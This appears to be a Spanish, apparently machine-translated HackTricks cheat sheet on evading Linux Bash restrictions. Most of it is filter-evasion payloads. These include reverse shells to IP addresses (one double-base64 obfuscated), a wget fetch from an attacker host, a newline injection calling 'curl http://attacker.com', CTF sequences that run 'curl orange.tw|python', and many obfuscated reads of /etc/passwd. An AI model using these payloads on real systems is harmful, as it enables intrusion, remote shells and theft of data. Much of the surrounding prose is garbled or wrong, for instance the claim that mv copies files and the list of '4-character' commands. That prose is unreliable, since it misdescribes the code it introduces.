# Saltar Restricciones en Linux

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Utiliza [**Trickest**](https://trickest.io/) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Saltos Comunes de Limitaciones

### Shell Inverso
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Shell inversa corta

Una shell inversa corta es una técnica utilizada en hacking para establecer una conexión remota a través de una shell inversa en un sistema comprometido. Esto permite al atacante obtener acceso y control total sobre el sistema comprometido.

La siguiente es una implementación básica de una shell inversa corta en Bash:

```bash
bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
```

En este ejemplo, la shell inversa se establece redirigiendo la entrada y salida estándar a través de un socket TCP en la dirección IP `10.0.0.1` y el puerto `1234`. Esto permite al atacante interactuar con el sistema comprometido a través de comandos Bash.

Es importante tener en cuenta que esta técnica puede ser detectada por sistemas de seguridad y firewalls, por lo que se recomienda utilizar técnicas más avanzadas y sigilosas para evitar ser detectado.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Bypass de rutas y palabras prohibidas

En algunas situaciones, es posible que te encuentres con restricciones en el uso de ciertas rutas o palabras en un sistema Linux. Sin embargo, existen formas de eludir estas restricciones y lograr acceder a lo que necesitas. A continuación, se presentan algunos comandos útiles para lograrlo:

#### Bypass de rutas

- **cd -P**: Este comando te permite seguir la ruta física real de un directorio, en lugar de seguir enlaces simbólicos. Puedes utilizarlo para evitar restricciones de rutas simbólicas.

- **cd ..**: Este comando te permite retroceder un nivel en la jerarquía de directorios. Puedes utilizarlo para evadir restricciones de acceso a ciertos directorios.

- **cd /ruta/real**: Si conoces la ruta física real de un directorio, puedes utilizar este comando para acceder directamente a él, sin importar las restricciones de rutas simbólicas.

#### Bypass de palabras prohibidas

- **mv**: En lugar de utilizar el comando prohibido, puedes utilizar el comando "mv" para renombrar o mover archivos y directorios. Por ejemplo, si el comando "cp" está prohibido, puedes usar "mv" para copiar archivos en su lugar.

- **/bin/ls**: Si el comando "ls" está prohibido, puedes utilizar la ruta completa "/bin/ls" para ejecutarlo.

- **/usr/bin/env**: Si un comando está prohibido, puedes utilizar "/usr/bin/env" seguido del nombre del comando para ejecutarlo. Por ejemplo, "/usr/bin/env python" ejecutará el comando "python".

Recuerda que eludir restricciones en un sistema sin autorización es ilegal y puede tener consecuencias legales graves. Estos comandos solo deben ser utilizados con fines educativos o en entornos controlados, como pruebas de penetración autorizadas.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Bypassar espacios prohibidos

Sometimes, when trying to execute a command that contains spaces, the system may interpret it as multiple commands or arguments. This can lead to errors or restrictions being imposed on the execution of certain commands.

To bypass these restrictions, you can use the following techniques:

1. Enclose the command in single quotes: 

   ```bash
   $ 'command with spaces'
   ```

2. Use backslashes to escape the spaces:

   ```bash
   $ command\ with\ spaces
   ```

3. Use double quotes to preserve the spaces:

   ```bash
   $ "command with spaces"
   ```

By using these techniques, you can bypass the restrictions imposed by the system and execute commands that contain spaces without encountering any issues.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Bypassar barra invertida y barra diagonal

Cuando se encuentre con restricciones que bloqueen el uso de barras invertidas (`\`) o barras diagonales (`/`) en comandos de Linux, puede utilizar las siguientes técnicas para evitar estas restricciones:

- **Usar caracteres hexadecimales**: Puede utilizar la notación hexadecimal para representar los caracteres que desea utilizar. Por ejemplo, en lugar de usar `\` o `/`, puede usar `\x5c` o `\x2f` respectivamente.

- **Usar caracteres octales**: Al igual que con la notación hexadecimal, puede utilizar la notación octal para representar los caracteres. Por ejemplo, en lugar de `\` o `/`, puede usar `\134` o `\57` respectivamente.

- **Usar comillas simples**: Puede encerrar el comando en comillas simples (`'`) en lugar de comillas dobles (`"`). Esto evitará que el intérprete de comandos realice la expansión de caracteres especiales, lo que le permitirá utilizar `\` o `/` sin restricciones.

- **Usar comillas dobles y escapar caracteres**: Si necesita utilizar comillas dobles (`"`) y escapar caracteres especiales, puede hacerlo escapando los caracteres con una barra invertida (`\`). Por ejemplo, puede utilizar `\"` para representar una comilla doble y `\\` para representar una barra invertida.

Estas técnicas le permitirán sortear las restricciones de barras invertidas y barras diagonales en comandos de Linux y ejecutar los comandos deseados.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Bypassar tuberías

Las restricciones de Bash a veces pueden dificultar el uso de ciertos comandos o técnicas de hacking. Sin embargo, hay formas de eludir estas restricciones y aprovechar al máximo las tuberías en Bash.

Una forma común de eludir las restricciones de Bash es utilizando el comando `sh`. Puedes usar `sh` para ejecutar comandos en un subshell y luego redirigir la salida a través de una tubería. Aquí tienes un ejemplo:

```bash
sh -c 'comando1 | comando2'
```

En este ejemplo, `comando1` se ejecuta en un subshell utilizando `sh -c`, y luego su salida se redirige a `comando2` a través de la tubería.

Otra forma de eludir las restricciones de Bash es utilizando el comando `eval`. `eval` evalúa y ejecuta una cadena como si fuera un comando. Aquí tienes un ejemplo:

```bash
eval "comando1 | comando2"
```

En este ejemplo, la cadena `"comando1 | comando2"` se evalúa y se ejecuta como un comando, permitiendo el uso de tuberías.

Recuerda que eludir las restricciones de Bash puede ser riesgoso y debe hacerse con precaución. Asegúrate de comprender completamente las implicaciones de seguridad antes de utilizar estas técnicas.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Bypass con codificación hexadecimal

En algunos casos, es posible eludir las restricciones de Bash utilizando la codificación hexadecimal. Esto implica convertir los caracteres en su representación hexadecimal y luego ejecutar el comando utilizando esta codificación.

Aquí hay un ejemplo de cómo hacerlo:

```bash
$ echo -e "\x63\x61\x74 /etc/passwd" | bash
```

En este ejemplo, el comando `echo` se utiliza para imprimir la cadena `\x63\x61\x74 /etc/passwd`, que se traduce en `cat /etc/passwd` en su forma hexadecimal. Luego, se utiliza el operador de tubería `|` para pasar esta cadena a Bash y ejecutarla.

Esto puede ser útil cuando se encuentran restricciones que bloquean ciertos comandos o caracteres en su forma original. Sin embargo, tenga en cuenta que esta técnica puede no funcionar en todos los casos y puede depender de las configuraciones específicas del sistema.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### Bypass IPs

#### Introduction

In some cases, you may encounter restrictions that prevent you from accessing certain IP addresses. However, there are ways to bypass these restrictions and gain access to the blocked IPs. This section will cover some useful Linux commands that can help you achieve this.

#### Method 1: Using a Proxy Server

One common method to bypass IP restrictions is by using a proxy server. A proxy server acts as an intermediary between your device and the target IP address, allowing you to access the blocked IP indirectly. Here's how you can do it:

1. Find a reliable proxy server that is not blocked by the target IP.
2. Configure your system to use the proxy server. You can do this by setting the `http_proxy` and `https_proxy` environment variables or by modifying the network settings in your system preferences.
3. Test the connection by accessing the blocked IP. If everything is set up correctly, you should be able to access the IP without any restrictions.

#### Method 2: Using a VPN

Another effective method to bypass IP restrictions is by using a Virtual Private Network (VPN). A VPN creates a secure and encrypted connection between your device and a remote server, allowing you to access the internet through the server's IP address. Here's how you can use a VPN to bypass IP restrictions:

1. Choose a reputable VPN service provider and sign up for an account.
2. Install the VPN client software on your device and configure it with your account credentials.
3. Connect to a VPN server located in a region where the blocked IP is accessible.
4. Once the VPN connection is established, your device will appear as if it is connected from the VPN server's IP address. You should now be able to access the blocked IP without any restrictions.

#### Method 3: Using Tor

Tor is a free and open-source software that allows anonymous communication by routing your internet traffic through a network of volunteer-operated servers. By using Tor, you can bypass IP restrictions and access blocked IPs. Here's how you can use Tor to bypass IP restrictions:

1. Install the Tor browser on your device from the official Tor Project website.
2. Launch the Tor browser and configure any necessary settings.
3. Once the Tor browser is running, it will automatically connect to the Tor network.
4. Use the Tor browser to access the blocked IP. Your connection will be routed through the Tor network, allowing you to bypass IP restrictions.

#### Conclusion

Bypassing IP restrictions can be useful in various scenarios, such as accessing blocked websites or services. By using proxy servers, VPNs, or Tor, you can bypass these restrictions and gain access to blocked IPs. However, it's important to note that bypassing IP restrictions may be against the terms of service of certain websites or services, so use these methods responsibly and ethically.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Exfiltración de datos basada en el tiempo

La exfiltración de datos basada en el tiempo es una técnica utilizada para extraer información de un sistema comprometido de forma encubierta y gradual, evitando así la detección. En lugar de enviar grandes cantidades de datos de una sola vez, esta técnica divide la información en pequeñas partes y la envía en intervalos de tiempo específicos.

#### Comandos útiles de Linux para eludir restricciones de Bash

A continuación se presentan algunos comandos útiles de Linux que se pueden utilizar para eludir las restricciones de Bash y llevar a cabo la exfiltración de datos basada en el tiempo:

1. **sleep**: El comando `sleep` se utiliza para pausar la ejecución de un script durante un período de tiempo especificado. Puede ser utilizado para establecer intervalos de tiempo entre la exfiltración de datos.

   ```bash
   sleep <segundos>
   ```

2. **date**: El comando `date` muestra la fecha y hora actual del sistema. Puede ser utilizado para registrar el tiempo de exfiltración de datos.

   ```bash
   date
   ```

3. **ping**: El comando `ping` se utiliza para enviar paquetes de datos a una dirección IP específica. Puede ser utilizado para enviar datos en pequeñas partes a través de la exfiltración de datos basada en el tiempo.

   ```bash
   ping -c 1 <dirección_IP>
   ```

4. **curl**: El comando `curl` se utiliza para transferir datos desde o hacia un servidor utilizando varios protocolos. Puede ser utilizado para enviar datos a través de solicitudes HTTP en la exfiltración de datos basada en el tiempo.

   ```bash
   curl -X POST -d "<datos>" <URL>
   ```

Estos comandos pueden ser utilizados de manera creativa y combinados con otras técnicas para llevar a cabo la exfiltración de datos basada en el tiempo de manera efectiva y encubierta. Es importante tener en cuenta que el uso de estas técnicas puede ser ilegal y solo debe realizarse con el permiso adecuado y para fines legítimos, como pruebas de penetración autorizadas.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Obteniendo caracteres de las variables de entorno

En algunas situaciones, es posible que te encuentres con restricciones en el intérprete de comandos Bash que te impidan ejecutar ciertos comandos o acceder a ciertos archivos. Sin embargo, aún puedes obtener información valiosa utilizando los valores de las variables de entorno.

Aquí hay un comando útil que puedes utilizar para obtener caracteres de las variables de entorno:

```bash
echo ${VARIABLE:OFFSET:LENGTH}
```

- `VARIABLE`: el nombre de la variable de entorno de la cual deseas obtener los caracteres.
- `OFFSET`: la posición inicial del primer carácter que deseas obtener.
- `LENGTH`: la cantidad de caracteres que deseas obtener a partir de la posición inicial.

Por ejemplo, si tienes una variable de entorno llamada `SECRET` con el valor `helloworld`, y deseas obtener los primeros tres caracteres, puedes ejecutar el siguiente comando:

```bash
echo ${SECRET:0:3}
```

Esto imprimirá `hel` en la salida.

Recuerda que este método solo te permite obtener caracteres de las variables de entorno y no te permite ejecutar comandos o acceder a archivos restringidos. Sin embargo, puede ser útil en ciertos escenarios donde necesitas extraer información específica de las variables de entorno disponibles.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### Exfiltración de datos DNS

Podrías usar **burpcollab** o [**pingb**](http://pingb.in) por ejemplo.

### Funciones internas

En caso de que no puedas ejecutar funciones externas y solo tengas acceso a un **conjunto limitado de funciones internas para obtener RCE**, hay algunos trucos útiles para hacerlo. Por lo general, **no podrás usar todas** las **funciones internas**, por lo que debes **conocer todas tus opciones** para intentar evadir la restricción. Idea de [**devploit**](https://twitter.com/devploit).\
En primer lugar, verifica todas las [**funciones internas del shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** A continuación, aquí tienes algunas **recomendaciones**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Inyección de comandos políglota

La inyección de comandos políglota es una técnica utilizada para evadir las restricciones de Bash y ejecutar comandos arbitrarios en un sistema. Esta técnica se basa en aprovechar las diferencias en la interpretación de comandos entre diferentes lenguajes de programación.

Un ejemplo común de inyección de comandos políglota es el uso de la función `eval()` en lenguajes como PHP o Python. Esta función permite ejecutar código arbitrario como si fuera parte del programa en sí. Al combinar esta función con la sintaxis de comandos de Bash, es posible ejecutar comandos en el sistema objetivo.

Aquí hay un ejemplo de inyección de comandos políglota utilizando la función `eval()` en PHP:

```php
<?php
$payload = "'; echo 'Command executed'; //";
eval($payload);
?>
```

En este ejemplo, el comando `echo 'Command executed'` se ejecutará en el sistema objetivo. El punto y coma al principio del payload se utiliza para cerrar cualquier comando anterior y evitar errores de sintaxis.

Es importante tener en cuenta que la inyección de comandos políglota puede ser peligrosa y debe utilizarse con precaución. Los sistemas deben estar debidamente protegidos para evitar este tipo de ataques.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Bypassar posibles regexes

A veces, al intentar ejecutar comandos en un sistema Linux, puedes encontrarte con restricciones que utilizan expresiones regulares (regexes) para filtrar o bloquear ciertos caracteres o patrones. Sin embargo, existen formas de eludir estas restricciones y ejecutar comandos de todos modos.

Aquí hay algunos métodos comunes para evitar las restricciones basadas en regexes:

1. **Usar caracteres de escape**: Puedes utilizar caracteres de escape, como la barra invertida (\), para evitar que los caracteres sean interpretados como parte de una expresión regular. Por ejemplo, si una restricción bloquea el carácter punto (.), puedes usar el comando `ls \.` para listar los archivos que comienzan con un punto.

2. **Utilizar comillas**: Las comillas simples ('') o dobles ("") pueden ayudarte a evitar que los caracteres sean interpretados como parte de una expresión regular. Por ejemplo, si una restricción bloquea el carácter asterisco (*), puedes usar el comando `ls '*'` para listar los archivos que contienen un asterisco en su nombre.

3. **Cambiar el orden de los caracteres**: A veces, cambiar el orden de los caracteres puede evitar que sean detectados por una expresión regular. Por ejemplo, si una restricción bloquea el carácter punto y coma (;), puedes intentar ejecutar el comando `ls ;echo hello` para listar los archivos y mostrar el mensaje "hello" al mismo tiempo.

Recuerda que eludir restricciones basadas en regexes puede ser considerado un comportamiento no autorizado y puede tener consecuencias legales. Solo debes utilizar estos métodos con fines educativos y éticos, y siempre obtener el permiso adecuado antes de realizar cualquier prueba de penetración.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator es una herramienta que se utiliza para ofuscar scripts de Bash con el objetivo de evadir restricciones y evitar la detección. Esta herramienta reescribe el código de Bash de manera que sea más difícil de entender y analizar para los sistemas de seguridad.

El Bashfuscator utiliza técnicas como la ofuscación de variables, la mezcla de caracteres y la inserción de código adicional para dificultar la comprensión del script. Esto puede ayudar a evitar la detección de patrones y a eludir las restricciones impuestas por los sistemas de seguridad.

Es importante tener en cuenta que el Bashfuscator no garantiza una protección completa contra la detección y el análisis de scripts de Bash. Sin embargo, puede ser una herramienta útil en ciertos escenarios donde se requiere evadir restricciones y mantener la confidencialidad de un script.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### RCE con 5 caracteres

En algunos casos, puede encontrarse con restricciones de Bash que limitan la ejecución de comandos. Sin embargo, hay una forma de eludir estas restricciones utilizando solo 5 caracteres. A continuación se muestra cómo hacerlo:

1. Abra una terminal y ejecute el siguiente comando:

```bash
echo $0
```

Esto mostrará el nombre del shell actual.

2. A continuación, ejecute el siguiente comando para iniciar un nuevo shell:

```bash
exec -a <nombre_shell> /bin/bash
```

Reemplace `<nombre_shell>` con el nombre del shell actual que obtuvo en el paso anterior.

3. Ahora tiene un nuevo shell con menos restricciones. Puede ejecutar comandos sin las limitaciones anteriores.

Es importante tener en cuenta que esta técnica solo funciona si tiene permisos suficientes para ejecutar el comando `exec`. Además, tenga en cuenta que el nuevo shell no heredará las variables de entorno del shell anterior.

¡Utilice esta técnica con precaución y solo en entornos controlados y autorizados!
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### RCE con 4 caracteres

En algunos casos, cuando se enfrenta a restricciones de Bash, puede ser útil conocer comandos que se pueden ejecutar con solo 4 caracteres. Estos comandos pueden ser útiles para lograr la ejecución remota de código (RCE) en situaciones en las que se restringe el uso de ciertos caracteres o comandos.

A continuación se muestra una lista de comandos de 4 caracteres que se pueden utilizar para el RCE:

- `echo`: Imprime un mensaje en la salida estándar.
- `true`: Devuelve un estado de éxito.
- `false`: Devuelve un estado de error.
- `read`: Lee una línea de entrada y la asigna a una variable.
- `exec`: Ejecuta un comando en el mismo proceso.
- `kill`: Envía una señal a un proceso.
- `test`: Evalúa una expresión y devuelve un estado de éxito o error.
- `time`: Mide el tiempo de ejecución de un comando.
- `wait`: Espera a que finalicen los procesos secundarios.
- `trap`: Captura y maneja señales.
- `exit`: Finaliza el script actual o el proceso actual.
- `jobs`: Muestra los trabajos en segundo plano.
- `bg`: Pone un trabajo en segundo plano.
- `fg`: Pone un trabajo en primer plano.
- `cd`: Cambia el directorio actual.
- `pwd`: Muestra el directorio actual.
- `umask`: Establece los permisos predeterminados para nuevos archivos y directorios.
- `unset`: Elimina una variable o función.
- `type`: Muestra información sobre un comando.
- `hash`: Muestra o establece la tabla de hash de comandos.
- `kill`: Envía una señal a un proceso.

Estos comandos pueden ser útiles cuando se enfrenta a restricciones de Bash y se necesita ejecutar comandos de forma remota. Sin embargo, es importante tener en cuenta que el uso de estos comandos puede depender de las restricciones específicas del entorno y del contexto en el que se esté trabajando.
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Bypass de Restricciones de Solo Lectura/Noexec/Distroless

Si te encuentras dentro de un sistema de archivos con las protecciones de solo lectura y noexec, o incluso en un contenedor distroless, aún existen formas de ejecutar binarios arbitrarios, ¡incluso una shell!:

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Bypass de Chroot y otras Jaulas

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Referencias y Más

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Utiliza [**Trickest**](https://trickest.io/) para construir y automatizar fácilmente flujos de trabajo con las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
